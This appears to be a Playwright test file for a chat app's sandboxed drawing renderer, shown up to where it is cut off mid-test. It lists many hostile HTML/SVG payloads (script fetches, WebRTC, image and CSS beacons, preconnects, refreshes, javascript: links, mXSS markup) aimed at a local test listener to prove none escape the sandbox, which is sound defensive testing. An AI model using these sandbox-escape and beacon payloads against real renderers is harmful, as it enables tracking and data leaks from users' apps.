// A drawing in the chat (src/chat/drawing/; docs/security/chat-drawings.md), walked by chat-drawing.spec.ts (Chromium,
// as CI runs the suite) and chat-drawing-webkit.spec.ts (WebKit, the macOS web view's engine, on a Mac that has it).
//
// The box: a page at the app's own address, served with the app's production policy from tauri.conf.json (Vite's
// dev server sends none), builds each hostile drawing with the app's own modules (sanitize.ts, drawingDoc.ts) and frames
// it as Drawing.tsx does. Each way out aims at a listener this spec starts on 127.0.0.1, at a port of its own, by
// `localhost` (which the app's `frame-src` lets a frame load) and by `127.0.0.1`: the listener counts every connection,
// even one that sends no byte, and must count none. Nothing here reaches the real network.
//
// "Why" cases build the simpler boxes the safety model turned down and show the listener does hear them: one sandboxed
// frame (it navigates itself to `localhost`), a nested box with the markup unfiltered (WebKit preconnects), and the box
// with scripts allowed (WebKit lets a script open connections no policy covers). If an engine ever closes one, its case
// fails and the model can be reconsidered. WebRTC is left out of the why cases: a peer connection makes WebKit announce
// a name on the local network, which can ask the person for permission; the scratch probe that saw it is in the item's
// report. Every hostile drawing below still carries a peer connection in a script, which never runs.
import { readFileSync } from "node:fs";
import { createServer, type Server, type Socket } from "node:net";
import { expect, test, type Page } from "@playwright/test";
import { chatOpen } from "./start";

const conf = JSON.parse(readFileSync(new URL("../src-tauri/tauri.conf.json", import.meta.url), "utf8")) as { app: { security: { csp: Record<string, string> } } };
/** The policy Tauri sends with the app's page in a release build (Tauri adds a hash or a nonce only for an inline script
 *  of index.html's, and it has none). */
export const APP_CSP = Object.entries(conf.app.security.csp)
  .map(([k, v]) => `${k} ${v}`)
  .join("; ");

/** The listener: every connection it is given, counted the moment it opens, with the first line it was sent once one
 *  comes (a connection that sends nothing still counts: it already told the other side the drawing was shown). */
export class Trap {
  private seen: { line: string }[] = [];
  port = 0;
  private server: Server | null = null;
  private socks = new Set<Socket>();
  get hits(): string[] {
    return this.seen.map((s) => s.line);
  }
  async open() {
    this.server = createServer((c) => {
      this.socks.add(c);
      const hit = { line: "a connection that sent nothing" };
      this.seen.push(hit);
      let got = "";
      c.on("data", (d) => {
        got += d.toString("latin1");
        hit.line = got.split("\r\n")[0];
      });
      c.on("error", () => {});
      c.on("close", () => this.socks.delete(c));
      // long enough for a request to follow a connection made ahead of it, then gone
      setTimeout(() => c.destroy(), 3000);
    });
    await new Promise<void>((done) => this.server!.listen(0, "127.0.0.1", done));
    this.port = (this.server.address() as { port: number }).port;
  }
  async close() {
    for (const s of this.socks) s.destroy();
    await new Promise<void>((done) => (this.server ? this.server.close(() => done()) : done()));
  }
}

/** How the box is built: as the app does, or one of the simpler boxes the model turned down. */
type Build = "app" | "one-frame" | "unfiltered" | "with-scripts";

/** The app's page with its own policy, and the bridge's stand-in in its main frame, as Tauri puts it there. `nonce`
 *  adds one to the policy's scripts, as Tauri would for a nonce token in index.html: the one way a drawing's script could
 *  ever run under the app's policy, which a why case needs and the app does not do. */
export async function boxPage(page: Page, nonce?: string) {
  const csp = nonce ? APP_CSP.replace("script-src 'self'", `script-src 'self' 'nonce-${nonce}'`) : APP_CSP;
  await page.route(
    (u) => u.pathname === "/__drawing-box",
    (r) => r.fulfill({ status: 200, contentType: "text/html; charset=utf-8", headers: { "content-security-policy": csp }, body: "<!doctype html><title>box</title><body></body>" }),
  );
  await page.goto("/__drawing-box");
  await page.evaluate(() => {
    (window as any).__TAURI_INTERNALS__ = { invoke() {} };
    (window as any).__got = [];
    addEventListener("message", (e) => (window as any).__got.push(String(e.data)));
  });
}

/** Frames `source` in the box and waits for it to load. Returns what the reading said. */
export async function draw(page: Page, source: string, build: Build = "app", o: { reduceMotion?: boolean } = {}) {
  return page.evaluate(
    async ([src, how, rm]) => {
      const d = (await import(/* @vite-ignore */ "/src/chat/drawing/drawingDoc.ts" as string)) as typeof import("../src/chat/drawing/drawingDoc");
      const s = (await import(/* @vite-ignore */ "/src/chat/drawing/sanitize.ts" as string)) as typeof import("../src/chat/drawing/sanitize");
      const meta = `<meta http-equiv="Content-Security-Policy" content="${d.escapeAttr(d.DRAWING_CSP)}">`;
      let doc: string;
      let sandbox = d.DRAWING_SANDBOX;
      let removed: string[] = [];
      let hadScripts = false;
      if (how === "app") {
        const p = s.prepareDrawing(src, { reduceMotion: rm });
        if (!p.ok) return { ok: false as const, why: p.why };
        removed = p.removed;
        hadScripts = p.parts.hadScripts;
        doc = d.outerDoc(d.innerDoc(p.parts), "A drawing");
      } else if (how === "one-frame") {
        doc = `<!doctype html><html><head>${meta}</head><body>${src}</body></html>`;
      } else {
        const inner = `<!doctype html><html><head>${meta}</head><body>${src}</body></html>`;
        doc = d.outerDoc(inner, "A drawing");
        if (how === "with-scripts") {
          // the script policy the brief first proposed, and scripts allowed in both frames
          const open = "default-src 'none'; script-src 'unsafe-inline'; style-src 'unsafe-inline'; img-src data: blob:; font-src data:; media-src data: blob:";
          const innerS = `<!doctype html><html><head><meta http-equiv="Content-Security-Policy" content="${open}"></head><body>${src}</body></html>`;
          doc = d.outerDoc(innerS, "A drawing").replace('sandbox=""', 'sandbox="allow-scripts"').replace(d.escapeAttr(d.DRAWING_CSP), open);
          sandbox = "allow-scripts";
        }
      }
      const f = document.createElement("iframe");
      f.setAttribute("sandbox", sandbox);
      f.style.cssText = "width:480px;height:320px;border:0";
      const loaded = new Promise((done) => (f.onload = done));
      f.srcdoc = doc;
      document.body.appendChild(f);
      await loaded;
      return { ok: true as const, removed, hadScripts };
    },
    [source, build, !!o.reduceMotion] as const,
  );
}

/** The drawing's own frame (the inner one; the outer when the box is one frame). */
const inner = (page: Page, build: Build = "app") => (build === "one-frame" ? page.frameLocator("iframe") : page.frameLocator("iframe").frameLocator("iframe"));

/** Long enough for a refresh, a preconnect or a beacon to have reached the listener and for it to have read a line. */
const settle = (page: Page) => page.waitForTimeout(1500);

/** The hostile drawings, by the way out each tries. `{L}` is the listener by `localhost`, `{I}` by `127.0.0.1`. Every
 *  one also holds a script that would try the same and report to the app; none may run. */
const WAYS: Record<string, string> = {
  "navigates itself: an address set by script, a refresh in its markup, a refresh in a frame of its own": `
    <script>location = "{L}/script-location"; location.assign("{I}/script-assign"); document.location.href = "{L}/doc-location"</script>
    <meta http-equiv="refresh" content="0;url={L}/meta-refresh">
    <iframe srcdoc="<meta http-equiv=refresh content='0;url={L}/nested-refresh'>"></iframe>`,
  "fetch, XHR, WebSocket, EventSource, sendBeacon, fetchLater and a worker, from a script": `
    <script>
      fetch("{L}/fetch"); const x = new XMLHttpRequest(); x.open("GET", "{I}/xhr"); x.send();
      new WebSocket("{L}".replace("http", "ws") + "/ws"); new EventSource("{I}/sse"); navigator.sendBeacon("{L}/beacon", "x");
      if (self.fetchLater) fetchLater("{L}/fetch-later", { activateAfter: 0 });
      new Worker(URL.createObjectURL(new Blob(['fetch("{L}/worker")'], { type: "text/javascript" })));
      import("{L}/import.js");
      top.postMessage("a script ran", "*");
    </script>`,
  "WebRTC, from a script": `
    <script>
      const pc = new RTCPeerConnection({ iceServers: [{ urls: "stun:127.0.0.1:{P}" }, { urls: "turn:127.0.0.1:{P}?transport=tcp", username: "u", credential: "p" }] });
      pc.createDataChannel("x"); pc.createOffer().then((o) => pc.setLocalDescription(o));
      top.postMessage("a peer connection was made", "*");
    </script>`,
  "image beacons: a picture, a source set, a picture element, an image button, a poster, an SVG image, an SVG filter image": `
    <img src="{L}/img"><img src="{I}/img2" onerror="new Image().src='{L}/onerror'"><img srcset="{L}/srcset 1x">
    <picture><source srcset="{L}/picture-source"><img src="data:,"></picture><input type="image" src="{L}/input-image">
    <video poster="{L}/poster"></video><svg width="40" height="40"><image href="{L}/svg-image" width="10" height="10"/>
    <image xlink:href="{I}/svg-image-xlink" xmlns:xlink="http://www.w3.org/1999/xlink" width="10" height="10"/>
    <filter id="f"><feImage href="{L}/fe-image"/></filter><rect width="10" height="10" filter="url(#f)"/></svg>
    <table background="{L}/table-background"><tr><td>x</td></tr></table><body background="{L}/body-background">`,
  "CSS: a background, an import, a font, a cursor, an image set, a border image, a list marker, generated content, a mask, an escaped url": `
    <style>
      @import url({L}/css-import); @import "{I}/css-import-string";
      @font-face { font-family: q; src: url({L}/css-font) } .q { font-family: q }
      .bg { background: url({L}/css-background) } .cur { cursor: url({L}/css-cursor), auto }
      .is { background-image: image-set("{L}/css-image-set" 1x) } .bi { border: 4px solid; border-image: url({L}/css-border-image) 1 }
      .ls { list-style-image: url({I}/css-list) } .ct::before { content: url({L}/css-content) }
      .mk { -webkit-mask-image: url({L}/css-mask); mask-image: url({L}/css-mask2) }
      .esc { background: \\75 rl({L}/css-escaped) }
      .fl { filter: url({L}/css-filter.svg#f) } .cp { clip-path: url({L}/css-clip.svg#c) }
    </style>
    <p class="q bg cur is bi ct mk esc fl cp">x</p><ul class="ls"><li>x</li></ul>
    <div style="background:url({I}/inline-style)">y</div>`,
  "links in its head: prefetch, preload, a module preload, a style sheet, an icon, a manifest, a prerender, a Link header": `
    <link rel="prefetch" href="{L}/prefetch"><link rel="preload" as="image" href="{L}/preload-image">
    <link rel="preload" as="fetch" crossorigin href="{L}/preload-fetch"><link rel="modulepreload" href="{L}/modulepreload">
    <link rel="stylesheet" href="{I}/stylesheet"><link rel="icon" href="{L}/icon"><link rel="manifest" href="{L}/manifest">
    <link rel="prerender" href="{L}/prerender"><meta http-equiv="Link" content="<{L}/meta-link>; rel=preload; as=image">
    <script type="speculationrules">{"prefetch": [{"source": "list", "urls": ["{L}/speculation"]}]}</script>`,
  "a preconnect": `<link rel="preconnect" href="{L}"><link rel="preconnect" href="{I}">`,
  "a DNS prefetch": `<link rel="dns-prefetch" href="{L}"><a href="{I}/x">a link</a>`,
  "a frame, an object, an embed, video, audio and a track of its own": `
    <iframe src="{L}/iframe"></iframe><iframe srcdoc="<img src='{L}/srcdoc-img'><script>fetch('{L}/srcdoc-fetch')</script>"></iframe>
    <object data="{L}/object"></object><embed src="{L}/embed"><frameset><frame src="{L}/frame"></frameset>
    <video src="{L}/video"><track src="{L}/track"></video><audio src="{I}/audio"></audio><video><source src="{L}/video-source"></video>`,
  "SVG references to another document, and animation that sets an address": `
    <svg width="60" height="60" xmlns:xlink="http://www.w3.org/1999/xlink">
      <use href="{L}/use.svg#a"/><use xlink:href="{I}/use-xlink.svg#a"/>
      <rect width="10" height="10" fill="url({L}/fill.svg#g)" stroke="url({L}/stroke.svg#g)"/>
      <path d="M0 0L10 10" marker-end="url({L}/marker.svg#m)"/><rect width="5" height="5" mask="url({L}/mask.svg#m)" clip-path="url({L}/clip.svg#c)" filter="url({L}/filter.svg#f)"/>
      <image width="5" height="5"><set attributeName="href" to="{L}/smil-set"/></image>
      <a id="smil"><set attributeName="href" to="{L}/smil-link"/><text y="20">x</text></a>
      <rect width="5" height="5"><animate attributeName="fill" values="red;url({L}/smil-fill.svg#g)" dur="1s"/></rect>
    </svg>`,
  "MathML and HTML hidden in SVG, which a second reading could read otherwise": `
    <math><mtext><table><mglyph><style><!--</style><img title="--&gt;&lt;img src={L}/mxss-1&gt;"></style></mglyph></table></mtext></math>
    <svg><style>&lt;img src={L}/mxss-2&gt;</style><foreignObject><img src="{L}/foreign-object"></foreignObject></svg>
    <svg></p><style><a id="</style><img src={L}/mxss-3>">`,
};

/** Drawings that need a press inside them: `#go` is pressed, and nothing may leave or open. */
const CLICKS: Record<string, string> = {
  "a link to its own address": `<a id="go" href="{L}/link-self">go</a>`,
  "a link that opens a new window": `<a id="go" href="{L}/link-blank" target="_blank">go</a>`,
  "a link that takes the whole window": `<a id="go" href="{L}/link-top" target="_top">go</a>`,
  "a link to the frame around it": `<a id="go" href="{I}/link-parent" target="_parent">go</a>`,
  "a base that sends every link to a new window": `<base href="{L}/base/" target="_blank"><a id="go" href="relative">go</a>`,
  "an SVG link to a new window": `<svg width="120" height="40"><a id="go" href="{L}/svg-link" target="_blank"><rect width="120" height="40"/></a></svg>`,
  "an image map's area": `<img src="data:image/gif;base64,R0lGODlhAQABAAAAACw=" usemap="#m" width="120" height="40" id="go"><map name="m"><area shape="rect" coords="0,0,120,40" href="{L}/area" target="_blank"></map>`,
  "a form sent to a new window": `<form action="{L}/form" method="post" target="_blank"><input name="a" value="1"><button id="go">go</button></form>`,
  "a form sent to itself": `<form action="{L}/form-self"><button id="go">go</button></form>`,
  "a link with a ping": `<a id="go" href="#here" ping="{L}/ping">go</a>`,
  "a download": `<a id="go" href="{L}/download" download>go</a>`,
  "a script address": `<a id="go" href="javascript:new Image().src='{L}/javascript-link'">go</a>`,
  "a script that opens a window on a press": `<button id="go" onclick="open('{L}/window-open')">go</button><script>document.getElementById("go").onclick = () => open("{L}/window-open-2")</script>`,
};

export function chatDrawingCases({ engine }: { engine: "chromium" | "webkit" }): void {
  test.describe("the box, under the app's own policy", () => {
    const trap = new Trap();
    test.beforeAll(async () => trap.open());
    test.afterAll(async () => trap.close());
    const fill = (s: string) => s.replace(/\{L\}/g, `http://localhost:${trap.port}`).replace(/\{I\}/g, `http://127.0.0.1:${trap.port}`).replace(/\{P\}/g, String(trap.port));

    /** Nothing reached the listener, no window opened, nothing was said to the app, and the app's page stayed put. */
    async function nothingLeft(page: Page, before: number, popups: () => number) {
      await settle(page);
      expect(trap.hits.slice(before)).toEqual([]);
      expect(popups()).toBe(0);
      expect(await page.evaluate(() => (window as any).__got)).toEqual([]);
      expect(new URL(page.url()).pathname).toBe("/__drawing-box");
      for (const f of page.frames()) expect(f.url()).not.toContain(String(trap.port));
    }

    test("the drawing runs nothing, its origin is opaque, and the policy is the first thing in both documents", async ({ page }) => {
      await boxPage(page);
      const before = trap.hits.length;
      const drawn = await draw(page, fill(`<p id="t">A chart</p><img src="data:," onerror="top.postMessage('handler ran','*')"><svg onload="top.postMessage('svg ran','*')"></svg><script>top.postMessage(String(top.__TAURI_INTERNALS__), "*")</script>`));
      expect(drawn).toMatchObject({ ok: true, hadScripts: true });
      await expect(inner(page).locator("#t")).toHaveText("A chart");
      // both frames have an empty sandbox
      expect(await page.locator("iframe").getAttribute("sandbox")).toBe("");
      expect(await page.frameLocator("iframe").locator("iframe").getAttribute("sandbox")).toBe("");
      const frames = page.frames().filter((f) => f !== page.mainFrame());
      expect(frames).toHaveLength(2);
      for (const f of frames) {
        // what the drawing would meet if anything of it ran (the test's own reach, not the drawing's)
        const seen = await f.evaluate(() => {
          const tryIt = (fn: () => unknown) => {
            try {
              return String(fn());
            } catch (e) {
              return (e as Error).name;
            }
          };
          return {
            origin: self.origin,
            bridge: typeof (window as any).__TAURI_INTERNALS__ + "/" + typeof (window as any).__TAURI__,
            storage: tryIt(() => localStorage.length),
            cookie: tryIt(() => document.cookie),
            idb: tryIt(() => indexedDB.open("x") && "opened"),
            top: tryIt(() => (top as Window).document.title),
            topBridge: tryIt(() => typeof (top as any).__TAURI_INTERNALS__),
            first: document.head.firstElementChild?.outerHTML,
          };
        });
        expect(seen.origin).toBe("null");
        expect(seen.bridge).toBe("undefined/undefined");
        expect(seen.storage).toBe("SecurityError");
        expect(["SecurityError", ""]).toContain(seen.cookie);
        expect(seen.idb).toBe("SecurityError");
        expect(seen.top).toBe("SecurityError");
        expect(seen.topBridge).toBe("SecurityError");
        expect(seen.first).toBe(`<meta http-equiv="Content-Security-Policy" content="default-src 'none'; script-src 'none'; style-src 'unsafe-inline'; img-src data:; font-src data:; frame-src 'none'; form-action 'none'; base-uri 'none'">`);
      }
      await nothingLeft(page, before, () => 0);
    });

    // Each way out twice: as the app builds the box (the filter and the box), and with the markup unfiltered (the box
    // alone). The box alone holds every way out but two, in WebKit only: a preconnect, and a press on a link that opens
    // a new window (directly or by a base), each a connection with no request on it. Those two are the filter's to stop,
    // and their unfiltered case shows the listener hears them, which is why the filter is there.
    const boxAloneLeaks = (name: string) =>
      engine === "webkit" &&
      ["a preconnect", "a link that opens a new window", "a base that sends every link to a new window", "an SVG link to a new window", "an image map's area"].includes(name);

    for (const build of ["app", "unfiltered"] as const) {
      const how = build === "app" ? "" : " (the box alone, markup unfiltered)";
      for (const [name, html] of Object.entries(WAYS))
        test(`cannot leave by ${name}${how}`, async ({ page }) => {
          let popups = 0;
          page.on("popup", () => popups++);
          await boxPage(page);
          const before = trap.hits.length;
          const drawn = await draw(page, fill(`<p id="shown">Still drawn</p>${html}`), build);
          if (drawn.ok) await expect(inner(page).locator("#shown")).toHaveText("Still drawn");
          // the MathML and hidden-HTML case may be refused outright by the second reading
          else expect(drawn.why).toBe("unsafe");
          if (build === "unfiltered" && boxAloneLeaks(name)) {
            await expect.poll(() => trap.hits.length - before, { timeout: 5000 }).toBeGreaterThan(0);
            return;
          }
          await nothingLeft(page, before, () => popups);
        });

      for (const [name, html] of Object.entries(CLICKS))
        test(`cannot leave by ${name}, pressed${how}`, async ({ page }) => {
          let popups = 0;
          page.on("popup", () => popups++);
          await boxPage(page);
          const before = trap.hits.length;
          expect(await draw(page, fill(`<p id="shown">Still drawn</p>${html}`), build)).toMatchObject({ ok: true });
          // what the filter took out cannot be pressed: the press lands where it was
          const go = inner(page).locator("#go");
          if (await go.count()) await go.click();
          else await inner(page).locator("#shown").click();
          // WebKit may open a connection for a press on a link to a new window, and does not every time: in the box alone
          // that is not asserted either way. The filter takes every such link out, and the app's own case above asserts
          // that nothing leaves.
          if (build === "unfiltered" && boxAloneLeaks(name)) return;
          await nothingLeft(page, before, () => popups);
        });
    }

    test("what the filter keeps is all the list allows: every element and attribute of every hostile drawing, read again in the frame", async ({ page }) => {
      await boxPage(page);
      let read = 0;
      for (const html of [...Object.values(WAYS), ...Object.values(CLICKS)]) {
        const drawn = await draw(page, fill(`<p>Still drawn</p>${html}`));
        if (!drawn.ok) continue;
        read++;
        // the check runs in the app's page, on the very document the inner frame was given, read by the engine's parser
        const bad = await page.evaluate(async () => {
          const d = (await import(/* @vite-ignore */ "/src/chat/drawing/drawingDoc.ts" as string)) as typeof import("../src/chat/drawing/drawingDoc");
          const outer = document.querySelectorAll("iframe");
          const f = outer[outer.length - 1].srcdoc;
          const innerDoc = new DOMParser().parseFromString(f, "text/html").querySelector("iframe")!.srcdoc;
          const doc = new DOMParser().parseFromString(innerDoc, "text/html");
          const out: string[] = [];
          const ns = (el: Element) => (el.namespaceURI === "http://www.w3.org/1999/xhtml" ? "html" : el.namespaceURI === "http://www.w3.org/2000/svg" ? "svg" : "other") as "html" | "svg" | "other";
          for (const el of Array.from(doc.body.querySelectorAll("*"))) {
            if (!d.keepElement(ns(el), el.localName, (n) => el.getAttribute(n), { reduceMotion: false })) out.push(`<${el.localName}>`);
            for (const a of Array.from(el.attributes)) if (!d.keepAttr(ns(el), el.localName, a.name, a.value)) out.push(`${el.localName}@${a.name}=${a.value}`);
          }
          for (const el of Array.from(doc.head.children).slice(3)) if (el.localName !== "style") out.push(`head <${el.localName}>`);
          return out;
        });
        expect(bad, html).toEqual([]);
      }
      // every drawing but the hidden-HTML one was drawn and read
      expect(read).toBeGreaterThanOrEqual(Object.keys(WAYS).length + Object.keys(CLICKS).length - 1);
    });
  });

  test.describe("why the box is built so: the simpler boxes let the listener hear them", () => {
    const trap = new Trap();
    test.beforeAll(async () => trap.open());
    test.afterAll(async () => trap.close());
    const L = () => `http://localhost:${trap.port}`;

    test("one sandboxed frame, scripts off and the policy on, still navigates itself to localhost, which the app's frame-src allows", async ({ page }) => {
      await boxPage(page);
      const before = trap.hits.length;
      await draw(page, `<a id="go" href="${L()}/one-frame-link">go</a>`, "one-frame");
      await page.frameLocator("iframe").locator("#go").click();
      await expect.poll(() => trap.hits.slice(before).some((h) => h.includes("/one-frame-link"))).toBe(true);
    });

    if (engine === "webkit") {
      test("in WebKit the nested box, scripts off and the policy on, still preconnects for an unfiltered link", async ({ page }) => {
        await boxPage(page);
        const before = trap.hits.length;
        await draw(page, `<link rel="preconnect" href="${L()}">`, "unfiltered");
        await expect.poll(() => trap.hits.length - before, { timeout: 5000 }).toBeGreaterThan(0);
      });
      test("in WebKit a script in the box opens a connection no policy covers, so scripts stay off", async ({ page }) => {
        // scripts allowed in the sandbox, and a nonce in the app's policy, which a drawing's script needs besides: the
        // app's own `script-src 'self'` is inherited by the box and refuses an inline script by itself
        await boxPage(page, "why");
        const before = trap.hits.length;
        await draw(page, `<script nonce="why">const l = document.createElement("link"); l.rel = "preconnect"; l.href = "${L()}"; document.head.append(l)</script>`, "with-scripts");
        await expect.poll(() => trap.hits.length - before, { timeout: 5000 }).toBeGreaterThan(0);
      });
    }
  });
}

// ---- in the chat: the card, the sheet and the limits, in the app itself ------------------------------------------------

const MOCK = Number(process.env.MANUT_MOCK_PORT || 5308);
/** A test-control op on the mock bridge (as markdown.spec.ts sends them). */
async function mock(op: string, params: Record<string, unknown> = {}): Promise<unknown> {
  const ws = new WebSocket(`ws://127.0.0.1:${MOCK}/?token=e2e`);
  await new Promise<void>((done, fail) => {
    ws.onopen = () => done();
    ws.onerror = () => fail(new Error("mock websocket error"));
  });
  const reply = await new Promise<{ ok: boolean; result: unknown }>((done) => {
    ws.onmessage = (m) => {
      const msg = JSON.parse(String(m.data));
      if (msg.id === "dw1") done(msg);
    };
    ws.send(JSON.stringify({ id: "dw1", op, ...params }));
  });
  ws.close();
  expect(reply.ok, JSON.stringify(reply)).toBe(true);
  return reply.result;
}
let said = 0;
/** Kami answers with `text`. */
const answer = (text: string) => mock("mock.emit", { events: [{ event: "message", bot: "kami", id: `dw-${++said}`, text }] });

/** A bar chart as an agent draws one: a style sheet, one SVG, a rising move of its own and a fade by SVG animation. */
export const CHART = `<style>
  .bar { fill: #4DA3FF; transform-origin: bottom; transform-box: fill-box; animation: grow .6s ease-out both }
  @keyframes grow { from { transform: scaleY(0) } to { transform: scaleY(1) } }
  text { font: 13px -apple-system, sans-serif; fill: #5c5b57 } .t { font-size: 16px; fill: #1f2022; font-weight: 600 }
</style>
<svg viewBox="0 0 640 280" role="img" aria-label="Pre-orders by day">
  <text class="t" x="24" y="32">Pre-orders this week</text>
  <line x1="24" y1="240" x2="616" y2="240" stroke="#d9d8d2"/>
  ${[42, 68, 55, 90, 120, 150, 98]
    .map((v, i) => `<rect class="bar" x="${40 + i * 82}" y="${240 - v}" width="48" height="${v}" rx="4"/><text x="${64 + i * 82}" y="262" text-anchor="middle">${["Mon", "Tue", "Wed", "Thu", "Fri", "Sat", "Sun"][i]}</text>`)
    .join("\n  ")}
  <circle cx="598" cy="40" r="6" fill="#22b455"><animate attributeName="opacity" values="1;0.3;1" dur="2s" repeatCount="indefinite"/></circle>
</svg>`;
const chartAnswer = (lang = "html") => "Here is this week's chart.\n\n```" + lang + "\n" + CHART + "\n```\n";

/** The app's page served with the policy of a debug build (tauri.conf.json `devCsp`: the stand-in bridge and Vite's own
 *  scripts need it), so a drawing's frames inherit an app policy as they do in the window. */
async function withAppPolicy(page: Page) {
  const dev = (JSON.parse(readFileSync(new URL("../src-tauri/tauri.conf.json", import.meta.url), "utf8")) as { app: { security: { devCsp: Record<string, string> } } }).app.security
    .devCsp;
  const csp = Object.entries(dev)
    .map(([k, v]) => `${k} ${v}`)
    .join("; ");
  await page.route(
    (u) => u.hostname === "127.0.0.1" && u.pathname === "/",
    async (route) => {
      if (route.request().resourceType() !== "document") return route.continue();
      const response = await route.fetch();
      return route.fulfill({ response, headers: { ...response.headers(), "content-security-policy": csp } });
    },
  );
}

const lastAnswer = (page: Page) => page.getByTestId("bubble-bot").last();
const cardFrame = (page: Page, n = 0) => page.getByTestId("drawing-frame").nth(n);

export function chatDrawingUiCases({ engine, layout }: { engine: "chromium" | "webkit"; layout: boolean }): void {
  test.describe("in the chat", () => {
    const trap = new Trap();
    test.beforeAll(async () => trap.open());
    test.afterAll(async () => trap.close());

    test.beforeEach(async ({ page }) => {
      await mock("mock.reset");
      await withAppPolicy(page);
      // every `message` listener the app adds, counted: a drawing must add none
      await page.addInitScript(() => {
        const add = window.addEventListener.bind(window);
        (window as any).__messageListeners = 0;
        window.addEventListener = ((type: string, ...rest: unknown[]) => {
          if (type === "message") (window as any).__messageListeners++;
          return (add as any)(type, ...rest);
        }) as typeof window.addEventListener;
      });
      await page.goto("/");
      await chatOpen(page);
    });

    test("a chart: Show drawing under its block, the card with the app's band and line, the closed box at the chart's shape, Open larger, Hide", async ({ page }) => {
      await answer(chartAnswer());
      const bubble = lastAnswer(page);
      await expect(bubble.locator("pre")).toContainText("Pre-orders this week");
      await expect(bubble.getByTestId("copy-code")).toHaveCount(1);
      await expect(bubble.getByTestId("drawing-card")).toHaveCount(0);
      await expect(page.locator("iframe")).toHaveCount(0);
      const listeners = await page.evaluate(() => (window as any).__messageListeners);

      await bubble.getByTestId("drawing-show").click();
      const card = bubble.getByTestId("drawing-card");
      await expect(card).toBeVisible();
      await expect(bubble.getByTestId("drawing-show")).toHaveText("Hide drawing");
      await expect(card.locator(".dw-by")).toHaveText("Drawn by Kami");
      await expect(card.getByTestId("drawing-note")).toHaveText("A closed box: no scripts, no network, no access to your files or this app.");
      await expect(card.getByTestId("drawing-no-scripts")).toHaveCount(0);
      const frame = card.getByTestId("drawing-frame");
      await expect(frame).toHaveAttribute("sandbox", "");
      await expect(frame).toHaveAttribute("title", "A drawing by Kami");
      expect(await frame.getAttribute("srcdoc")).toMatch(/^<!doctype html><html><head><meta http-equiv="Content-Security-Policy" content="default-src 'none'; script-src 'none';/);
      await expect(card.frameLocator("iframe").frameLocator("iframe").locator("text.t")).toHaveText("Pre-orders this week");
      // its height is the chart's own shape at the card's width (640 by 280)
      const box = (await frame.boundingBox())!;
      expect(Math.abs(box.height - Math.round(box.width * (280 / 640)))).toBeLessThanOrEqual(2);
      // inside the answer's column, and nothing of it outside its card
      const col = (await bubble.locator(".b.md").boundingBox())!;
      const c = (await card.boundingBox())!;
      expect(box.x).toBeGreaterThanOrEqual(c.x - 1);
      expect(box.x + box.width).toBeLessThanOrEqual(c.x + c.width + 1);
      expect(c.x + c.width).toBeLessThanOrEqual(col.x + col.width + 1);

      // Open larger: the same closed box in a sheet of the app's own, its band and line, closed by Escape
      await card.getByTestId("drawing-larger").click();
      const sheet = page.getByTestId("drawing-sheet");
      await expect(sheet).toBeVisible();
      await expect(sheet).toHaveAttribute("role", "dialog");
      await expect(sheet.locator(".dw-by")).toHaveText("Drawn by Kami");
      await expect(page.getByTestId("drawing-sheet-close")).toBeFocused();
      const big = sheet.getByTestId("drawing-frame");
      await expect(big).toHaveAttribute("sandbox", "");
      expect(await big.getAttribute("srcdoc")).toBe(await frame.getAttribute("srcdoc"));
      await expect(sheet.frameLocator("iframe").frameLocator("iframe").locator("text.t")).toHaveText("Pre-orders this week");
      expect((await big.boundingBox())!.height).toBeGreaterThan(box.height);
      await page.keyboard.press("Escape");
      await expect(sheet).toHaveCount(0);
      await expect(card.getByTestId("drawing-larger")).toBeFocused();
      // and by a press outside it
      await card.getByTestId("drawing-larger").click();
      await page.getByTestId("drawing-sheet-back").click({ position: { x: 6, y: 6 } });
      await expect(page.getByTestId("drawing-sheet")).toHaveCount(0);

      // the app heard nothing from either frame and listens for nothing new
      expect(await page.evaluate(() => (window as any).__messageListeners)).toBe(listeners);

      await bubble.getByTestId("drawing-show").click();
      await expect(bubble.getByTestId("drawing-card")).toHaveCount(0);
      await expect(page.locator("iframe")).toHaveCount(0);
    });

    test("an svg block offers it too; a block in another language does not", async ({ page }) => {
      await answer("```svg\n" + CHART.slice(CHART.indexOf("<svg")) + "\n```\n\n```js\nconsole.log('<svg></svg>')\n```");
      const bubble = lastAnswer(page);
      await expect(bubble.locator("pre")).toHaveCount(2);
      await expect(bubble.getByTestId("drawing-show")).toHaveCount(1);
      await bubble.getByTestId("drawing-show").click();
      await expect(bubble.getByTestId("drawing-frame")).toHaveAttribute("sandbox", "");
    });

    test("a hostile drawing, through the chat itself, reaches nothing and says its scripts did not run", async ({ page }) => {
      let popups = 0;
      page.on("popup", () => popups++);
      const L = `http://localhost:${trap.port}`;
      const I = `http://127.0.0.1:${trap.port}`;
      await answer(
        "```html\n" +
          `<meta http-equiv="refresh" content="0;url=${L}/chat-refresh"><link rel="preconnect" href="${L}"><img src="${I}/chat-img">` +
          `<style>p{background:url(${L}/chat-css)}</style><p id="go"><a href="${L}/chat-link" target="_blank">Open the shop</a></p>` +
          `<script>fetch("${L}/chat-fetch"); top.postMessage("ran", "*")</script>\n` +
          "```",
      );
      const bubble = lastAnswer(page);
      const before = trap.hits.length;
      await bubble.getByTestId("drawing-show").click();
      await expect(bubble.getByTestId("drawing-no-scripts")).toHaveText("Its scripts do not run here, so a part drawn by code may be missing.");
      const inner = bubble.frameLocator("iframe").frameLocator("iframe");
      await expect(inner.locator("a")).toHaveText("Open the shop");
      await inner.locator("a").click();
      await page.waitForTimeout(1500);
      expect(trap.hits.slice(before)).toEqual([]);
      expect(popups).toBe(0);
      expect(new URL(page.url()).pathname).toBe("/");
    });

    test("at most three live: a fourth puts the oldest back to a still card, and Show there brings it back", async ({ page }) => {
      const svg = (n: number) => "```svg\n" + `<svg viewBox="0 0 200 60"><text x="10" y="35">Drawing ${n}</text></svg>` + "\n```";
      await answer([1, 2, 3, 4].map(svg).join("\n\n"));
      const bubble = lastAnswer(page);
      const shows = bubble.getByTestId("drawing-show");
      await expect(shows).toHaveCount(4);
      for (let i = 0; i < 4; i++) await shows.nth(i).click();
      await expect(page.getByTestId("drawing-frame")).toHaveCount(3);
      const cards = bubble.getByTestId("drawing-card");
      await expect(cards.nth(0).getByTestId("drawing-still")).toBeVisible();
      await expect(cards.nth(0).getByTestId("drawing-still")).toContainText("Put away to keep the chat light.");
      for (const i of [1, 2, 3]) await expect(cards.nth(i).getByTestId("drawing-frame")).toHaveCount(1);
      await cards.nth(0).getByTestId("drawing-again").click();
      await expect(cards.nth(0).getByTestId("drawing-frame")).toHaveCount(1);
      await expect(cards.nth(1).getByTestId("drawing-still")).toBeVisible();
